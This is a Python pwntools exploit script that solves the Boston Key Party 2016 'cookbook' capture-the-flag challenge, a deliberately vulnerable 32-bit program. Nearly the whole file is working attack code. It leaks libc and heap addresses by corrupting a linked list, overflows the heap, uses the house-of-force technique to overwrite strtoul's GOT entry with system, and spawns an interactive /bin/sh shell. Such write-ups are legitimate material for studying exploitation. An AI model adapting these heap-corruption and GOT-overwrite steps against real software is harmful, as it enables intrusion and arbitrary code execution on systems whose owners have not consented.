# -*- coding: utf-8 -*-
#
# Boston Key Party 2016 pwnable cookbook
#

from pwn import *
import re
import ctypes

r = process('./cookbook')
b = ELF('./cookbook')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')

STRTOUL_GOT = b.got['strtoul']
STRTOUL_OFFSET = libc.symbols['strtoul']
SYSTEM_OFFSET = libc.symbols['system']

def s(msg):
    r.send(msg + '\n')

def stou(i):
    return ctypes.c_uint32(i).value

def fill_heap(nr):
    for i in xrange(0, nr):
        s('g')
        s(hex(0x5))
        s(p32(0xdeadbeef))

def add_leak(addr):
    s('c')
    s('n') # calloc(1, 0x40c)
    s('d') # free()
    s('q')

    s('a')
    s('n') # *0x804d09c = malloc(0x90), alloc overlapping chunk
    s('g')
    s(p32(0xcafebabe))
    s('e') # calloc(1, 8), add CURRENT_INGREDIENT to INGREDIENT_LIST
    s('q')

    s('c')
    s('g')
    OVERWRITE = 'AAAABBBBCCCC' + p32(addr) + p32(0) # overwrite the linked list
    s(OVERWRITE) # [ ptr to node | ptr to next == 0 ]
    s('q')

def parse_ingredient():
    r.clean()
    s('l') # INGREDIENT_LIST = *0x804d094
    resp = r.recv()

    print resp

    li = resp.split('------')
    last = li[-2]

    print last

    #m = re.search("calories: ([ +-]\d+)", last)
    m = re.search("calories: ([-]*\d+)", last)
    return stou(int(m.groups()[0]))

def ei(ingredient):
    s('e')
    s(ingredient)

if __name__ == "__main__":
    r.recvuntil("what's your name?")
    s('babo')

    #
    # stabilize heap
    #

    ei('water')
    ei('tomato')
    ei('basil')
    ei('garlic')
    ei('onion')
    ei('lemon')
    ei('corn')
    ei('olive oil')
    
    fill_heap(0x200)

    #
    # calc LIBC_BASE
    #

    add_leak(STRTOUL_GOT)
    leaked = parse_ingredient()
    LIBC_BASE = leaked - STRTOUL_OFFSET

    log.info('LIBC_BASE: 0x%x' % LIBC_BASE)

    #
    # leak heap address (CURRENT_RECIPE)
    #

    s('c')
    s('n')
    s('d')
    s('q')
    add_leak(0x804d0a0)
    leaked = parse_ingredient()

    log.info("CURRENT_RECIPE: 0x%x" % leaked)

    raw_input('after leaking 0x804d0a0...\n')

    FGETS_BUF = leaked + 0x134
    HEAP_WILDERNESS = leaked + 0x4b4
    log.info("HEAP_WILDERNESS: 0x%x" % HEAP_WILDERNESS)

    #
    # heap overflow 
    #
    # fgets((char*)CURRENT_RECIPE + 140, 1036, stdin)
    #

    s('c')
    s('n') # calloc(1, 0x40c)
    s('g')
    s('A' * (HEAP_WILDERNESS-FGETS_BUF) + p32(0xffffffff))
    s('q')

    raw_input('after overwriting heap wilderness...\n')

    #
    # house-of-force
    #

    MAGIC_MALLOC = (STRTOUL_GOT - HEAP_WILDERNESS - 8) & 0xffffffff
    log.info('STRTOUL_GOT: 0x%x' % STRTOUL_GOT)
    log.info('MAGIC_MALLOC: 0x%x' % MAGIC_MALLOC)
    log.info('system: 0x%x' % (LIBC_BASE + SYSTEM_OFFSET))

    s('g')
    s(hex(MAGIC_MALLOC)) # alloc large amounts of memory, and next malloc will be...
    s('X')

    s('g')
    s('0x5') # this malloc will overlap with strtoul@got
    s(p32(LIBC_BASE+SYSTEM_OFFSET))

    #
    # strtoul("/bin/sh")
    #

    s('g')
    s('/bin/sh\x00')

    r.clean()
    r.interactive()
